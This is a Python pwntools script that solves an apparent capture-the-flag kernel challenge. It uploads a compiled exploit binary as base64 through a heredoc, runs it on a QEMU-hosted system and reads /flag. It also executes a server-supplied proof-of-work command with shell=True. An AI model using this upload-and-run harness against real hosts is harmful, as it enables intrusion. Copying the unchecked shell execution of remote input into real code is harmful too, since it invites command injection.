#!/usr/bin/env python3

from pwn import *
import subprocess
import base64
import gzip

HOST = 'localhost'
PORT = 50000

subprocess.check_call(['make'])

with open('exploit', 'rb') as fin:
    exploit = fin.read()

qemu_argv = ['qemu-system-x86_64', '-initrd', '../custom_system/initramfs.cpio.gz', '-kernel', '../custom_system/bzImage', '-append', "root=/dev/ram console=ttyS0 oops=panic quiet",
 '-nographic', '-monitor', '/dev/null', '-m', '256', '-smp', '1', '-no-reboot']

io = remote(HOST, PORT)
#io = process(qemu_argv)

io.recvline_contains(b'proof of work:')
pow_cmd = io.recvline().decode().strip()
log.info('Solving proof-of-work: %s', pow_cmd)
pow_res = subprocess.check_output(pow_cmd, shell=True).decode()
log.info('Sending proof-of-work solution: %s', pow_res)
io.recvuntil(b'solution: ')
io.sendline(pow_res.encode())
io.recvuntil(b'\x1bc\x1b[?7l\x1b[2J~ ')

exploit_gzip = gzip.compress(exploit)
exploit_b64 = base64.b64encode(exploit_gzip).decode()

io.recvuntil(b'$')
io.sendline(b'cd /tmp')

io.recvuntil(b'$')
io.sendline(f'cat <<EOF > exploit.gz.b64'.encode())
log.info('exploit b64 len: %d', len(exploit_b64))
sent = 0
for i in range(0, len(exploit_b64), 76):
    exploit_line = exploit_b64[i:i+76]
    io.sendline(f'{exploit_line}'.encode())
    sent += len(exploit_line)
assert sent == len(exploit_b64), (sent, len(exploit_b64))
io.sendline(b'EOF')

io.recvuntil(b'$')
io.sendline(b'base64 -d exploit.gz.b64 | gunzip > exploit')
io.sendline(b'chmod +x exploit')
io.sendline(b'./exploit')
io.sendline(b'cat /flag')

io.recvuntil(b'SSM{')
flag = 'SSM{' + io.recvline().decode().strip()

log.info('Flag: %s', flag)

#io.interactive()
